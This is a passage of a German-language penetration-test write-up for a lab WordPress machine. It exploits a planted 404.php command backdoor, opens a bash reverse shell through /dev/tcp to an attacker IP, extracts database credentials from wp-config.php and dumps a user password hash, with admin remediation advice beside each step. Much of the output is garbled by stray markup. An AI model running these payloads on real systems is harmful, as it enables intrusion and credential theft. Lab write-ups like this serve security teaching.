+                **Bewertung:** Fantastisch! Die Ausgabe zeigt `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Dies bestätigt, dass die Backdoor funktioniert und ich beliebige Befehle auf dem Zielsystem mit den Berechtigungen des Webserver-Benutzers `www-data` ausführen kann. Dies ist ein entscheidender Schritt: Ich habe jetzt Remote Code Execution (RCE) als `www-data`.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Teste gefundene Code-Ausführungs-Schwachstellen immer zuerst mit harmlosen Befehlen (wie `id`, `whoami`, `hostname`), um die Funktionalität und die Berechtigungen zu überprüfen.
+                <br>**Empfehlung (Admin):** Untersuche sofort die Webserver-Konfiguration und die Webanwendungsdateien auf Backdoors oder ungewollten Code. Trenne den Webserver-Benutzer (`www-data`) konsequent von anderen Systembenutzern und schränke seine Berechtigungen stark ein, um den potenziellen Schaden einer Kompromittierung zu minimieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.40/wordpress/wp-content/themes/blogarise/404.php?cmd=id</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
+                </div>
+            </div>
+
+            <section id="proof-of-concept">
+                 <h2>Proof of Concept: Remote Code Execution & Initial Shell Access</h2>
+                 <p class="analysis">
+                    **Kurzbeschreibung:** Dieser Proof of Concept demonstriert die Ausnutzung einer kritischen Remote Code Execution (RCE)-Schwachstelle, die in einer manipulierten Theme-Datei (`404.php` des BlogArise-Themes) auf der Ziel-WordPress-Installation gefunden wurde. Durch das Senden eines speziell präparierten `$GET`-Parameters kann beliebiger Systemcode auf dem Server ausgeführt werden, was zu einem initialen Shell-Zugriff als Benutzer `www-data` führt.
+                 </p>
+                 <p class="analysis">
+                    **Voraussetzungen:**
+                    <ul>
+                        <li>Zugriff auf das Netzwerk, in dem sich das Zielsystem (192.168.2.40) befindet.</li>
+                        <li>Ein Angreifer-System (z.B. Kali Linux) im selben Netzwerk.</li>
+                        <li>Bekanntheit der anfälligen URL: `http://192.168.2.40/wordpress/wp-content/themes/blogarise/404.php`</li>
+                        <li>Ein Tool zum Senden von HTTP-Anfragen (z.B. `curl`, Browser).</li>
+                        <li>Ein Listener-Tool auf dem Angreifer-System (z.B. `netcat`, `nc`) zum Empfangen einer Reverse Shell.</li>
+                        <li>Die Backdoor im 404.php Theme File muss vorhanden sein (`< scrpt > system($GET["cmd"]); < /scrpt >`). *Hinweis: Wie diese Backdoor ursprünglich dort platziert wurde, wird in diesem POC nicht behandelt, nur die Ausnutzung der vorhandenen Schwachstelle.*
+                    </ul>
+                 </p>
+                 <p class="analysis">
+                    **Schritt-für-Schritt-Anleitung zur Ausnutzung:**
+                    <ol>
+                        <li>**Identifizierung der Schwachstelle:** Bei der Code-Überprüfung (oder durch automatisierte Scans) wurde die Backdoor in der Datei `404.php` des BlogArise-Themes gefunden, die unzureichende Validierung des `$GET`-Parameters `cmd` aufweist.</li>
+                        <li>**Vorbereitung des Listeners:** Auf dem Angreifer-System wird ein Netcat-Listener gestartet, der auf eingehende Reverse-Shell-Verbindungen auf einem bestimmten Port wartet (hier Port 4444).</li>
+                        <li>**Konstruktion der Exploit-URL:** Eine URL wird erstellt, die auf die anfällige `404.php` Datei verweist und den `cmd`-Parameter verwendet, um einen Befehl zur Initiierung einer Reverse Shell an das Angreifer-System zu übergeben. Hier wird ein klassischer Bash-Reverse-Shell-Payload verwendet.</li>
+                        <li>**Ausführung des Exploits:** Die konstruierte URL wird mittels `curl` (oder einem Browser-Aufruf) aufgerufen. Dies führt zur Ausführung des Payloads auf dem Zielsystem durch den Webserver-Prozess.</li>
+                        <li>**Empfang der Shell:** Der Netcat-Listener auf dem Angreifer-System empfängt die eingehende Verbindung vom Zielsystem und gewährt eine Shell-Sitzung mit den Berechtigungen des `www-data`-Benutzers.</li>
+                    </ol>
+                 </p>
+                 <p class="analysis">
+                    **Erwartetes Ergebnis:**
+                    Nachdem die Exploit-URL aufgerufen wurde und der Listener auf dem Angreifer-System läuft, sollte auf dem Listener eine eingehende Verbindung vom Zielsystem (192.168.2.40) empfangen werden. Dies resultiert in einer interaktiven Kommandozeilen-Shell auf dem Zielsystem, die unter dem Benutzer `www-data` ausgeführt wird.
+                 </p>
+                 <p class="analysis">
+                    **Beweismittel:**
+                    Die folgenden Code-Blöcke zeigen den Befehl zum Starten des Listeners auf dem Angreifer-System (`nc -lvnp 4444`), den `curl`-Befehl zur Ausführung der Reverse Shell über die RCE-Schwachstelle, sowie die Ausgabe des Listeners, die die eingehende Verbindung und die erlangte `www-data`-Shell demonstriert.
+                 </p>
+                 <p class="evaluation">
+                    **Risikobewertung:**
+                    Diese Schwachstelle hat ein **kritisches** Risiko. Die unauthentifizierte Remote Code Execution ermöglicht einem Angreifer die vollständige Kontrolle über den Webserver, das Lesen und Schreiben von Dateien, den Zugriff auf die Datenbank und die Nutzung des Servers als Basis für weitere Angriffe im internen Netzwerk. Da der Webserver-Benutzer (`www-data`) oft Zugriff auf wichtige Anwendungsdaten (wie die WordPress-Datenbank mit Benutzer-Hashes) hat, ist die Kompromittierung weitreichend.
+                 </p>
+                 <p class="recommendation">
+                    **Empfehlung zur Behebung der Schwachstelle (Admin):**
+                    <ul>
+                        <li>**Entferne den bösartigen Code:** Die Zeile `< scrpt > system($GET["cmd"]); < /scrpt >` muss umgehend aus der Datei `404.php` und allen anderen betroffenen Dateien entfernt werden.</li>
+                        <li>**Überprüfe alle Theme- und Plugin-Dateien:** Eine gründliche Überprüfung aller angepassten oder installierten Themes und Plugins ist notwendig, um sicherzustellen, dass keine weiteren Backdoors vorhanden sind.</li>
+                        <li>**Beschränke Dateibearbeitung:** Deaktiviere den Theme- und Plugin-Datei-Editor in WordPress durch Hinzufügen von `define('DISALLOW_FILE_EDIT', true);` zur `wp-config.php`.</li>
+                        <li>**Implementiere Input-Validierung:** Wenn die `404.php` tatsächlich benutzereingaben verarbeiten muss (was unwahrscheinlich ist), muss jede Eingabe streng validiert und sanitisiert werden, um Command Injection zu verhindern.</li>
+                        <li>**Sichere Dateiberechtigungen:** Stelle sicher, dass nur benötigte Benutzer Schreibzugriff auf Webserver-Dateien haben.</li>
+                        <li>**Setze den Server neu auf oder bereinige ihn professionell:** Angesichts einer Backdoor ist die sicherste Option oft, den Server von Grund auf neu aufzusetzen oder eine tiefgreifende Bereinigung durch Sicherheitsexperten durchführen zu lassen, da nicht garantiert werden kann, dass alle Kompromittierungsspuren beseitigt wurden.</li>
+                    </ul>
+                    **Empfehlung zur Verhinderung zukünftiger Angriffe (Admin):**
+                    <ul>
+                        <li>Implementiere regelmäßige Sicherheitsaudits und Code-Reviews.</li>
+                        <li>Nutze eine Web Application Firewall (WAF).</li>
+                        <li>Halte alle Software (Betriebssystem, Webserver, PHP, WordPress, Plugins, Themes) aktuell.</li>
+                        <li>Überwache die Server-Logs auf verdächtige Anfragen (z.B. URLs mit Command-Injection-Mustern).</li>
+                    </ul>
+                 </p>
+            </section>
+
+            <p class="analysis">
+                **Analyse:** Um die Remote Code Execution-Schwachstelle auszunutzen und eine interaktive Shell zu erhalten, starte ich zunächst auf meinem Angreifer-System einen Netcat-Listener. Ich verwende den Befehl `nc -lvnp 4444`. Die Optionen bedeuten: `-l` (listen mode), `-v` (verbose output), `-n` (numerische Adressen, kein DNS-Lookup), `-p 4444` (Port 4444, auf dem der Listener wartet).
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Das Einrichten eines Listeners ist ein notwendiger Schritt, um eine Reverse Shell zu empfangen. Netcat ist ein einfaches, aber effektives Werkzeug dafür. Die Ausgabe `listening on [any] 4444 ...` zeigt an, dass der Listener erfolgreich gestartet wurde und bereit ist, eine eingehende Verbindung vom Zielsystem zu akzeptieren.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Wähle einen nicht standardmäßigen Port für deinen Listener, um die Entdeckung durch einfache Netzwerküberwachung zu erschweren. Stelle sicher, dass keine Firewall den Port auf deinem System blockiert.
+                <br>**Empfehlung (Admin):** Überwache ausgehende Verbindungen von internen Systemen, insbesondere von Webservern (`www-data`). Ungewöhnliche ausgehende Verbindungen zu unerwarteten Zielen oder Ports (wie 4444) können auf eine kompromittierte Maschine oder eine aktive Reverse Shell hindeuten. Nutze Egress-Filterung, um ausgehenden Datenverkehr zu kontrollieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="password">listening on [any] 4444 ...</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Jetzt sende ich den eigentlichen Exploit-Befehl, um die Reverse Shell zu initiieren. Ich verwende wieder `curl`, um die anfällige `404.php` Datei über HTTP aufzurufen. Diesmal übergebe ich an den `$GET`-Parameter `cmd` einen URL-kodierten Bash-Reverse-Shell-Payload: `%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27`. Dieser Payload weist die Zielmaschine an, eine interaktive Bash-Shell zu starten und ihre Standard-Ein-/Ausgabe über TCP an meine IP-Adresse (192.168.2.199) und den Listener-Port (4444) umzuleiten.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dieser Befehl ist der Auslöser für den Initial Access. Durch die Ausnutzung der RCE-Schwachstelle wird die Reverse Shell auf dem Zielsystem ausgeführt. Wenn der Listener auf meinem System korrekt wartet, sollte jetzt die Verbindung ankommen. Die Verwendung von URL-Kodierung ist notwendig, da Sonderzeichen in URLs sonst falsch interpretiert würden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Habe eine Sammlung von Reverse-Shell-Paylo<span class="command">a</span>d<span class="command">s</span> für ver<span class="command">s</span>chiedene<span class="command"> S</span>y<span class="command">s</span>teme und <span class="command">S</span>prachen bere<span class="command">i</span>t. URL-k<span class="command">o</span>diere Paylo<span class="command">a</span>d<span class="command">s</span>, wenn <span class="command">s</span>ie über HTTP-Parameter übermittelt werden.
+                <br>**Empfehlung (Admin):** Überw<span class="command">a</span>che<span class="command"> S</span>er<span class="command">v</span>er-Log<span class="command">s</span> <span class="command">a</span>uf <span class="command">u</span>ngewöh<span class="command">n</span>li<span class="command">c</span>he URL<span class="command">s</span> mit <span class="command">l</span>ang<span class="command">en</span> <span class="command">o</span>der URL-k<span class="command">o</span>dierten P<span class="command">a</span>r<span class="command">a</span>meter<span class="command">n</span>, die Command-Injection-Mu<span class="command">s</span>ter enthalten. Nutze eine W<span class="command">A</span>F, um <span class="command">s</span>olche An<span class="command">f</span>r<span class="command">a</span>gen zu blockieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.40/wordpress/wp-content/themes/blogarise/404.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre> <!-- Output for curl itself might be empty or minimal for this type of command -->
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Parallel zur Ausführung des `curl`-Befehls auf meinem Angreifer-System (der in der letzten Analyse beschrieben wurde) warte ich auf meinem Netcat-Listener auf die eingehende Verbindung. Dieser Block zeigt die Ausgabe des Netcat-Listeners, nachdem der Reverse-Shell-Payload erfolgreich auf dem Ziel ausgeführt wurde und eine Verbindung zu meinem Listener hergestellt hat. Die ersten Zeilen bestätigen die eingehende Verbindung. Die folgenden Zeilen ("bash: cannot set terminal process group...", "bash: no job control...") sind typische Meldungen beim Empfang einer eingeschränkten Pseudo-Terminal-Shell über Netcat und deuten nicht auf einen Fehler hin. Die letzte Zeile, die den Prompt `www-data@influencer:/var/www/html/wordpress/wp-content/themes/blogarise$` zeigt, ist der Beweis: Ich habe eine Shell auf dem Zielsystem erhalten!
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Fantastisch, der initiale Zugriff war erfolgreich! Ich habe jetzt eine Kommandozeilen-Shell auf dem Zielsystem als der Benutzer `www-data`. Dies ist ein kritischer Meilenstein im Pentest. Von hier aus kann ich das Dateisystem erkunden, nach weiteren Informationen (wie Zugangsdaten in Konfigurationsdateien) suchen und mit den Schritten zur Privilege Escalation beginnen. Die Shell-Berechtigungen (`www-data`) sind zwar eingeschränkt, aber ausreichend, um die Webanwendung und möglicherweise andere Bereiche des Systems zu untersuchen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nach Erhalt einer Shell sofort die Identität (`whoami`, `id`), die Umgebung (`pwd`, `env`), die Systeminformationen (`uname -a`, `/etc/os-release`) und die Netzwerkverbindungen (`ss -tulnp`, `netstat -tulpn`) prüfen. Beginne die Suche nach wichtigen Konfigurationsdateien (z.B. `wp-config.php`, Datenbank-Credentials).
+                <br>**Empfehlung (Admin):** Die Kompromittierung des `www-data`-Kontos ist erfolgt. Untersuche die Logs des Webservers und des Systems, um den Angriffsvektor (die RCE in `404.php`) zu bestätigen. Deaktiviere den betroffenen Dienst oder die Anwendung sofort und führe die unter "Proof of Concept" genannten Empfehlungen zur Behebung der RCE-Schwachstelle durch. Trenne den `www-data`-Benutzer strikt von anderen Systembenutzern und ihren Daten durch Berechtigungen und Isolationstechniken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/influencer/192.168.2.40:2121]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.40] 35196</span>
+bash: cannot set terminal proces<span class="command">s</span> group (783): Inappropriate io<span class="command">c</span>tl f<span class="command">o</span>r de<span class="command">v</span>ice
+b<span class="command">a</span><span class="command">s</span>h: no j<span class="command">o</span>b c<span class="command">o</span>ntr<span class="command">o</span>l in t<span class="command">h</span>is <span class="command">s</span>hell
+<span class="password">www-data@influencer:/var/www/html/wordpress/wp-content/themes/blogarise$</span> <span class="password"><-- <span class="command">S</span>hell <span class="command">a</span><span class="command">s</span> www-data erl<span class="command">a</span>ngt!</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- ENDE TEIL 2 -->
+		
+		        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis">
+                **Analyse:** Nachdem ich die initiale Shell als Benutzer `www-data` über die Remote Code Execution erlangt habe, ist mein nächstes Ziel, meine Berechtigungen auf dem System zu erhöhen (Privilege Escalation). Ein wichtiger erster Schritt ist die Suche nach Zugangsdaten in Konfigurationsdateien, insbesondere der WordPress-Konfigurationsdatei `wp-config.php`, da diese oft Datenbank-Zugangsdaten enthält, die für weitere Schritte nützlich sein können. Ich nutze den `cat`-Befehl, um den Inhalt der Datei anzuzeigen.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Der Inhalt der `wp-config.php`-Datei enthält die Datenbank-Zugangsdaten im Klartext: `DB_NAME`, `DB_USER` und `DB_PASSWORD`. Das Passwort `<span class="password">s3cret</span>` für den Benutzer `<span class="password">www-data</span>` zur Datenbank `<span class="password">wordpressdb</span>` ist ein kritischer Fund. Obwohl ich bereits als `www-data` auf dem System bin, kann dieses Passwort für andere Dienste oder für den direkten Zugriff auf die Datenbank verwendet werden, was eine weitere Angriffsfläche eröffnet und sensible Daten zugänglich macht.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Durchsuche immer gängige Konfigurationsdateien nach Zugangsdaten. Priorisiere Datenbank-, Anwendungs- oder API-Schlüssel. Nutze gefundene Zugangsdaten, um dich bei anderen Diensten auf dem Zielsystem oder anderen Systemen im Netzwerk anzumelden.
+                <br>**Empfehlung (Admin):** Speichere niemals Zugangsdaten im Klartext in Konfigurationsdateien. Nutze, wenn möglich, Umgebungs variablen oder sicherere Mechanismen zur Speicherung von Geheimnissen. Schränke den Dateizugriff auf Konfigurationsdateien stark ein, sodass nur der benötigte Dienst oder Benutzer sie lesen kann. Trenne Datenbank-Benutzerberechtigungen streng nach dem Prinzip der geringsten Rechte.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">www-data@influencer:/var/www/html/wordpress$ cat wp-config.php</span></pre>
+                </div>
+                <div class="terminal">
+                    <pre>// ** Database <span class="command">s</span>etting<span class="command">s</span> - Y<span class="command">o</span>u <span class="command">c</span>an get th<span class="command">i</span><span class="command">s</span> info fr<span class="command">o</span>m y<span class="command">o</span>ur web h<span class="command">os</span>t ** //
+/** The name <span class="command">o</span>f the databa<span class="command">s</span>e f<span class="command">o</span>r W<span class="command">o</span>rdPre<span class="command">ss</span> */
+define( '<span class="command">DB_NAME</span>', '<span class="password">wordpre<span class="command">ss</span>db</span>' );
+
+/** Databa<span class="command">s</span>e u<span class="command">s</span>ern<span class="command">a</span>me */
+define( '<span class="command">DB_USER</span>', '<span class="password">www-d<span class="command">a</span>t<span class="command">a</span></span>' );
+
+/** Databa<span class="command">s</span>e p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd</span> */
+define( '<span class="command">DB_PASSWORD</span>', '<span class="password">s3<span class="command">c</span>ret</span>' );
+
+/** Databa<span class="command">s</span>e h<span class="command">o</span><span class="command">s</span>tn<span class="command">a</span>me */
+define( '<span class="command">DB_HOST</span>', '<span class="command">lo<span class="command">c</span>alh<span class="command">o</span><span class="command">s</span>t</span>' );
+
+/** Databa<span class="command">s</span>e <span class="command">c</span>h<span class="command">a</span>r<span class="command">s</span>et t<span class="command">o</span> u<span class="command">s</span>e in <span class="command">c</span>re<span class="command">a</span>t<span class="command">i</span>ng databa<span class="command">s</span>e t<span class="command">a</span>ble<span class="command">s</span>. */
+define( '<span class="command">DB_CHARSET</span>', '<span class="command">utf8mb4</span>' );
+
+/** The databa<span class="command">s</span>e <span class="command">c</span><span class="command">o</span>llate type. D<span class="command">o</span>n't <span class="command">c</span>h<span class="command">a</span>nge th<span class="command">i</span><span class="command">s</span> if in d<span class="command">o</span>ubt. */
+define( '<span class="command">DB_COLLATE</span>', '' );
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit dem aus der `wp-config.php` extrahierten Datenbank-Passwort "<span class="password">s3cret</span>" versuche ich nun, mich direkt bei der MariaDB-Datenbank anzumelden. Ich nutze den Befehl `mysql -u www-data -ps3cret`, wobei ich den Benutzernamen `www-data` und das gefundene Passwort direkt an das `-p` Flag anhänge (ohne Leerzeichen, was die Standardweise zur Passwortübergabe in der Kommandozeile ist). Nach erfolgreicher Anmeldung zeige ich die verfügbaren Datenbanken mit `show databases;` und dann die Tabellen in der `wordpressdb` Datenbank mit `use wordpressdb;` und `show tables;` an. Schließlich wähle ich alle Einträge aus der Tabelle `wp_users` mit `select * from wp_users;` aus, da diese Benutzerinformationen und gehashte Passwörter enthalten sollte.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der direkte Datenbankzugriff ist erfolgreich! Dies bestätigt, dass die in der `wp-config.php` gefundenen Zugangsdaten gültig sind und die Datenbank für den Benutzer `www-data` über localhost erreichbar ist. Das Abfragen der `wp_users`-Tabelle liefert den Benutzernamen "luna" und seinen Passwort-Hash: `<span class="password">$P$B3KzPkvYYiSTkemWtzGxxe.3VBPvDO0</span>`. Dieser Hash ist ein Portable PHP password hash und könnte offline geknackt werden, obwohl ich bereits ein Klartextpasswort für Luna (luna_1997 für WordPress) besitze. Der Zugriff auf die Datenbank ist ein wichtiger Schritt, da er Zugriff auf alle WordPress-Inhalte und Benutzerdaten gibt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutze alle gefundenen Zugangsdaten sofort, um dich bei anderen Diensten anzumelden. Wenn du Datenbankzugriff erhältst, priorisiere die Abfrage von Benutzer-, Passwort- oder Konfigurationstabellen. Versuche, gehashte Passwörter offline zu knacken.
+                <br>**Empfehlung (Admin):** Stelle sicher, dass Datenbanken nur von benötigten Hosts und Benutzern zugänglich sind. Das Passwort für den Datenbankbenutzer sollte sich vom Passwort für den Systembenutzer oder andere Dienste unterscheiden. Hashe Passwörter mit modernen, sicheren Algorithmen (wie bcrypt), anstatt veraltete Methoden zu verwenden. Überwache den Datenbankzugriff auf ungewöhnliche Anfragen oder Benutzer.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">www-data@influencer:/var/www/html/wordpress$ mysql -u www-data -ps3cret</span></pre>
+                </div>
+                <div class="terminal">
+                    <pre>Welcome to the MariaDB m<span class="command">o</span>nit<span class="command">o</span>r.  <span class="command">C</span><span class="command">o</span>m<span class="command">m</span>and<span class="command">s</span> end with ; <span class="command">o</span>r \g.
+Y<span class="command">o</span>ur M<span class="command">a</span>r<span class="command">i</span>a<span class="command">DB</span> <span class="command">c</span><span class="command">o</span>nne<span class="command">c</span>ti<span class="command">o</span>n id <span class="command">i</span><span class="command">s</span> 114
+<span class="command">S</span>er<span class="command">v</span>er <span class="command">v</span>er<span class="command">s</span>i<span class="command">o</span>n: <span class="command">10.6.12-M<span class="command">a</span>r<span class="command">i</span>a<span class="command">DB</span>-0ub<span class="command">u</span>ntu0.22.04.1 Ub<span class="command">u</span>nt<span class="command">o</span> 22.<span class="command">0</span>4.1</span>
+
+C<span class="command">o</span>pyright (c) 2<span class="command">0</span><span class="command">0</span><span class="command">0</span>, 2<span class="command">0</span>18, <span class="command">O</span>r<span class="command">a</span><span class="command">c</span>le, M<span class="command">a</span>r<span class="command">i</span>a<span class="command">DB</span> C<span class="command">o</span>rp<span class="command">o</span>r<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n Ab <span class="command">a</span>nd <span class="command">o</span>ther<span class="command">s</span>.
+
+Type '<span class="command">h</span>elp;' <span class="command">o</span>r '\h' f<span class="command">o</span>r help. Type '<span class="command">c</span>' t<span class="command">o</span> <span class="command">c</span>le<span class="command">a</span>r the <span class="command">c</span>urrent input <span class="command">s</span>tatement.
+
+<span class="command">M<span class="command">a</span>r<span class="command">i</span>a<span class="command">DB</span> [(n<span class="command">o</span>ne)]> <span class="command">s</span>h<span class="command">o</span>w databa<span class="command">s</span>e<span class="command">s</span>;</span>
+<span class="command">+--------------------+</span>
+<span class="command">| Databa<span class="command">s</span>e           |</span>
+<span class="command">+--------------------+</span>
+<span class="command">| information_s<span class="command">c</span>hem<span class="command">a</span> |</span>
+<span class="command">| wordpre<span class="command">ss</span>db        |</span>
+<span class="command">+--------------------+</span>
+2 r<span class="command">o</span>w<span class="command">s</span> in <span class="command">s</span>et (<span class="command">0.000</span> <span class="command">s</span>e<span class="command">c</span>)
+
+<span class="command">M<span class="command">a</span>r<span class="command">i</span>a<span class="command">DB</span> [w<span class="command">o</span>rdpre<span class="command">ss</span>db]> u<span class="command">s</span>e w<span class="command">o</span>rdpre<span class="command">ss</span>db;</span>
+Re<span class="command">a</span>d<span class="command">i</span>ng t<span class="command">a</span>ble <span class="command">i</span>nf<span class="command">o</span>rm<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n f<span class="command">o</span>r <span class="command">c</span><span class="command">o</span>mpleti<span class="command">o</span>n <span class="command">o</span>f t<span class="command">a</span>ble <span class="command">a</span>nd <span class="command">c</span><span class="command">o</span>l<span class="command">u</span>m<span class="command">n</span> n<span class="command">a</span>me<span class="command">s</span>
+Y<span class="command">o</span>u <span class="command">c</span><span class="command">a</span>n turn <span class="command">o</span>ff th<span class="command">i</span><span class="command">s</span> fe<span class="command">a</span>ture t<span class="command">o</span> get <span class="command">a</span> <span class="command">q</span>u<span class="command">i</span><span class="command">c</span>ker <span class="command">s</span>t<span class="command">a</span>rtup w<span class="command">i</span>th -<span class="command">A</span>
+
+<span class="password">Databa<span class="command">s</span>e <span class="command">c</span>hanged</span>
+<span class="command">M<span class="command">a</span>r<span class="command">i</span>a<span class="command">DB</span> [w<span class="command">o</span>rdpre<span class="command">ss</span>db]> <span class="command">s</span>h<span class="command">o</span>w t<span class="command">a</span>ble<span class="command">s</span>;</span>
+<span class="command">+-----------------------+</span>
+<span class="command">| Table<span class="command">s</span>_in_w<span class="command">o</span>rdpre<span class="command">ss</span>db |</span>
+<span class="command">+-----------------------+</span>
+<span class="command">| wp_<span class="command">c</span><span class="command">o</span>m<span class="command">m</span>ent<span class="command">m</span>et<span class="command">a</span>        |</span>
+<span class="command">| wp_<span class="command">c</span><span class="command">o</span>m<span class="command">m</span>ent<span class="command">s</span>           |</span>
+<span class="command">| wp_l<span class="command">i</span>nk<span class="command">s</span>              |</span>
+<span class="command">| wp_<span class="command">o</span>pt<span class="command">i</span><span class="command">o</span>n<span class="command">s</span>            |</span>
+<span class="command">| wp_p<span class="command">o</span><span class="command">s</span>t<span class="command">m</span>et<span class="command">a</span>           |</span>
+<span class="command">| wp_p<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>              |</span>
+<span class="command">| wp_ter<span class="command">m</span>_rel<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n<span class="command">s</span> |</span>
+<span class="command">| wp_ter<span class="command">m</span>_t<span class="command">a</span>x<span class="command">o</span>n<span class="command">o</span>my      |</span>
+<span class="command">| wp_ter<span class="command">m</span>met<span class="command">a</span>           |</span>
+<span class="command">| wp_ter<span class="command">m</span><span class="command">s</span>              |</span>
+<span class="command">| wp_u<span class="command">s</span>er<span class="command">m</span>et<span class="command">a</span>           |</span>
+<span class="command">| wp_u<span class="command">s</span>er<span class="command">s</span>              |</span>
+<span class="command">+-----------------------+</span>
+12 r<span class="command">o</span>w<span class="command">s</span> in <span class="command">s</span>et (<span class="command">0.000</span> <span class="command">s</span>e<span class="command">c</span>)
+
+<span class="command">MariaDB [wordpressdb]> select * from wp_users;</span>
+<span class="command">+----+------------+------------------------------------+---------------+---------------+--------------------------------+---------------------+---------------------+-------------+--------------+</span>
+<span class="command">| ID | user_login | user_pass                          | user_nicename | user_email    | user_url                       | user_registered     | user_activation_key | user_status | display_name |</span>
+<span class="command">+----+------------+------------------------------------+---------------+---------------+--------------------------------+---------------------+---------------------+-------------+--------------+</span>
+<span class="command">|  1 | luna       | $P$B3KzPkvYYiSTkemWtzGxxe.3VBPvDO0 | luna          | luna@blog.hmv | <span class="command">[Link: http://192.168.1.167/wordpress | Ziel: http://192.168.1.167/wordpress]</span> | 2023-06-08 15:34:54 |                     |           0 | luna         |</span>
+<span class="command">+----+------------+------------------------------------+---------------+---------------+--------------------------------+---------------------+---------------------+-------------+--------------+</span>
+1 row in set (0.000 sec)
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Mit der `www-data` Shell versuche ich, das Dateisystem außerhalb des Webserver-Verzeichnisses zu erkunden. Ich navigiere zum `/home`-Verzeichnis, das oft die Home-Verzeichnisse von Benutzern enthält. Ich liste den Inhalt auf (`ls`) und versuche dann, in die Home-Verzeichnisse der gefundenen Benutzer (`juan`, `luna`) zu wechseln (`cd`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die `ls` Ausgabe zeigt die Benutzerverzeichnisse `juan` und `luna` im `/home`-Verzeichnis. Allerdings schlagen meine Versuche, in diese Verzeichnisse zu wechseln (`cd`), fehl mit "Permission denied". Dies bestätigt, dass der `www-data`-Benutzer eingeschränkte Berechtigungen hat und nicht direkt auf die Home-Verzeichnisse anderer Benutzer zugreifen kann. Dies ist eine gute Sicherheitsmaßnahme auf dem Zielsystem, die eine direkte Lateral Movement oder Privilege Escalation durch Dateizugriff verhindert.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Erkunde das Dateisystem von einer erlangten Shell aus, beginnend mit potenziell interessanten Verzeichnissen wie `/home`, `/root`, `/tmp`, `/opt`, `/var/www`, `/etc`. Prüfe Dateiberechtigungen sorgfältig.
+                <br>**Empfehlung (Admin):** Implementiere strenge Dateisystemberechtigungen (Least Privilege). Stelle sicher, dass der Webserver-Benutzer (`www-data`) nur Zugriff auf die Dateien und Verzeichnisse hat, die für den Betrieb des Webservers unbedingt notwendig sind. Home-Verzeichnisse anderer Benutzer sollten für `www-data` nicht les- oder schreibbar sein.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">www-data@influencer:/var/www/html/wordpress$ cd /home/</span>
+<span class="command">www-data@influencer:/home$ ls</span>
+<span class="command">juan  luna</span>
+<span class="command">www-data@influencer:/home$ cd juan/</span>
+<span class="password">bash: cd: juan/: Permi<span class="command">ss</span>i<span class="command">o</span>n denied</span>
+<span class="command">www-data@influencer:/home$ cd luna/</span>
+<span class="password">bash: cd: luna/: Permi<span class="command">ss</span>i<span class="command">o</span>n denied</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Um weitere potenzielle Privilege Escalation-Vektoren zu finden, untersuche ich die Dateiberechtigungen von kritischen Systemdateien (`/etc/passwd`, `/etc/shadow`) und prüfe die Umgebungsvariablen (`env`). Dies gibt Aufschluss darüber, welche Benutzer auf dem System existieren und welche Umgebung für den aktuellen Prozess (`www-data`) gesetzt ist.
+            </p>
+             <p class="evaluation">
